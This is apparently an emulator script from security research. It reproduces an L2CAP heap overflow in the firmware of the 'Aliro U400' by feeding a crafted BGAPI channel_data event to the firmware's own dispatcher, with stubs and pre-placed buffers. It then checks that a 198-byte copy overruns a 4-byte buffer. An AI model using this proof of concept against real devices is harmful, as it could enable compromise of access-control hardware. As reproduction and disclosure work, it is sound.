:name: Aliro U400 — L2CAP overflow via the firmware's REAL top-level event dispatch (max fidelity)
:description: Delivers a complete BGAPI `l2cap_channel_data` event to the firmware's own registered
: top-level event callback sub_805df38. The firmware then runs its OWN code end-to-end: the SDK
: dispatcher sli_bt_l2cap_transfer_on_bt_event (sub_801de58) masks the event id and demultiplexes
: it to the channel_data case -> the reassembly handler sub_801d96c -> find-transfer -> the data
: callback on_data_received (real .data vtable[1]) -> the unclamped memcpy => heap OOB write.
: NO forced PC below the callback entry; the id demux, gate, find-transfer, reassembly and copy are
: all real firmware. (Emulator ceiling: no BLE radio model, so the event is injected at the stack's
: event boundary rather than arriving over the air; the joined-channel transfer + reassembly buffer
: are pre-placed and the FreeRTOS init-lock is stubbed, because the radio-init path fatally traps and
: a natural boot cannot reach a live BLE stack in Renode.)

using sysbus
emulation SetGlobalSerialExecution true
mach create "mg24"
machine LoadPlatformDescription @platforms/boards/silabs/brd4186c.repl
sysbus LoadELF @/home/chen/aliro-renode/matter/aliro-u400/firmware/U400_primary_target.elf
sysbus.cpu VectorTableOffset 0x08006000

# ---- stubs (labeled scaffolding) ----
# debug loggers -> bx lr
sysbus WriteWord 0x8033598 0x4770
sysbus WriteWord 0x80336f0 0x4770
sysbus WriteWord 0x80cae30 0x4770
# FreeRTOS init-lock gate sub_801e0f8 -> return 1 (movs r0,#1; bx lr); lock release -> bx lr
sysbus WriteDoubleWord 0x801e0f8 0x47702001
sysbus WriteWord 0x801e124 0x4770
sysbus WriteWord 0x801e114 0x4770
# LR trap
sysbus WriteWord 0x2000EE00 0xE7FE

# ---- REAL CoC callback vtable at its real .data address 0x20002828 ----
sysbus LoadBinary @matter/aliro-u400/scenarios/aliro_real_vtable.bin 0x20002828

# ---- reassembly buffer B @0x20032000 (declared sdu_size = 4); sentinel-fill B and beyond ----
sysbus LoadBinary @matter/aliro-u400/scenarios/aliro_fill_a5.bin 0x20032000

# ---- transfer descriptor D @0x20032300 (transfer = D+4 = 0x20032304), clear of B's overflow ----
#   D+0x08 vtable ptr -> real vtable ; D+0x0c cid ; D+0x0e max_sdu=500 ; D+0x10 max_pdu=247
#   D+0x14 sdu_pointer=0 (first fragment) ; D+0x28 conn ; D+0x38 reassembly buf -> B
sysbus LoadBinary @matter/aliro-u400/scenarios/aliro_desc_zero.bin 0x20032300
sysbus WriteDoubleWord 0x20032308 0x20002828
sysbus WriteWord       0x2003230c 0x0040
sysbus WriteWord       0x2003230e 0x01F4
sysbus WriteWord       0x20032310 0x00F7
sysbus WriteWord       0x20032314 0x0000
sysbus WriteByte       0x20032328 0x01
sysbus WriteDoubleWord 0x20032338 0x20032000

# ---- register the transfer the way a joined device would (array slot0 = D ; RX list head = transfer) ----
sysbus WriteDoubleWord 0x2001b758 0x20032300
sysbus WriteDoubleWord 0x20013878 0x20032304

# ---- the BGAPI l2cap_channel_data event @0x20031000 ----
sysbus LoadBinary @matter/aliro-u400/scenarios/aliro_ev_chandata.bin 0x20031000

# ---- observation hooks (read-only) ----
sysbus.cpu AddHook 0x801de58 "self.ErrorLog('MARK_DISPATCH  sli_bt_l2cap_transfer_on_bt_event(msg) id=0x{0:X}'.format(self.Bus.ReadDoubleWord(self.GetRegister(0).RawValue)))"
sysbus.cpu AddHook 0x801d96c "self.ErrorLog('MARK_REASSEMBLY channel_data handler sub_801d96c')"
sysbus.cpu AddHook 0x805e7b0 "self.ErrorLog('MARK_ON_DATA_RECEIVED offset={0} len={1}'.format(self.GetRegister(1).RawValue, self.GetRegister(2).RawValue))"
sysbus.cpu AddHook 0x805e838 "self.ErrorLog('MARK_MEMCPY dest=0x{0:X} len={1} (no clamp)'.format(self.GetRegister(0).RawValue, self.GetRegister(2).RawValue))"

echo "=== deliver a real l2cap_channel_data BGAPI event to the firmware top-level callback sub_805df38 ==="
echo ">>> B[0..7] BEFORE (expect A5 sentinel):"
sysbus ReadDoubleWord 0x20032000
sysbus ReadDoubleWord 0x20032004

# enter at the firmware's registered event callback: sub_805df38(ctx, msg, ctx)
sysbus.cpu SetRegister 0  0x200027d0
sysbus.cpu SetRegister 1  0x20031000
sysbus.cpu SetRegister 2  0x200027d0
sysbus.cpu SetRegister 13 0x2003F000
sysbus.cpu SetRegister 14 0x2000EE01
sysbus.cpu PC 0x805df38
sysbus.cpu Step 20000

echo ">>> PC after (0x2000ee00 => ran to the LR trap cleanly):"
sysbus.cpu PC
echo ">>> B[0..3]   (declared sdu_size=4; expect 0x41414141 written):"
sysbus ReadDoubleWord 0x20032000
echo ">>> B+0x04    (first OOB byte past the 4-byte SDU; expect 0x41414141):"
sysbus ReadDoubleWord 0x20032004
echo ">>> B+0xC0=192 (still inside the 198-byte copy; expect 0x41414141):"
sysbus ReadDoubleWord 0x200320C0
echo ">>> B+0xC8=200 (past the 198-byte copy; expect A5 sentinel, unwritten):"
sysbus ReadDoubleWord 0x200320C8
echo "=== overflow: 4-byte declared SDU, 198-byte copy => 194-byte heap OOB write ==="
quit
